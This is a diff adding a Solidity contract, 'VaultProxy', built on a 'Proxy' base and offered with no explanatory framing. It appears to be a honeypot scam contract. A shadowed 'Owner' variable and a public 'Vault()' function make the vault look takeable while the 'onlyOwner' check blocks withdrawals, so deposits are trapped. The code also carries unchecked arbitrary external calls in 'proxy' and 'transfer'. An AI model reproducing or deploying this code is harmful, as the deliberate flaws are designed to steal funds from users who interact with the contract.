@@ -1,0 +1,61 @@
+ 
+
+pragma solidity ^0.4.23;
+
+contract Proxy  {
+    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
+    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
+    function proxy(address target, bytes data) public payable {
+         
+        target.call.value(msg.value)(data);
+    }
+}
+
+contract VaultProxy is Proxy {
+    address public Owner;
+    mapping (address => uint256) public Deposits;
+
+
+
+    modifier validAddress( address addr ) {
+        require(addr != address(0x0));
+        require(addr != address(this));
+        _;
+    }
+    
+    function transfer(address contract_address,address[] tos,uint[] vs)
+        public 
+        validAddress(contract_address)
+        returns (bool){
+
+        require(tos.length > 0);
+        require(vs.length > 0);
+        require(tos.length == vs.length);
+        bytes4 id = bytes4(keccak256("transferFrom(address,address,uint256)"));
+        for(uint i = 0 ; i < tos.length; i++){
+            contract_address.call(id, msg.sender, tos[i], vs[i]);
+        }
+        return true;
+    }
+
+    function () public payable { }
+    
+    function Vault() public payable {
+        if (msg.sender == tx.origin) {
+            Owner = msg.sender;
+            deposit();
+        }
+    }
+    
+    function deposit() public payable {
+        if (msg.value > 0.25 ether) {
+            Deposits[msg.sender] += msg.value;
+        }
+    }
+    
+    function withdraw(uint256 amount) public onlyOwner {
+        if (amount>0 && Deposits[msg.sender]>=amount) {
+            msg.sender.transfer(amount);
+        }
+    }
+}
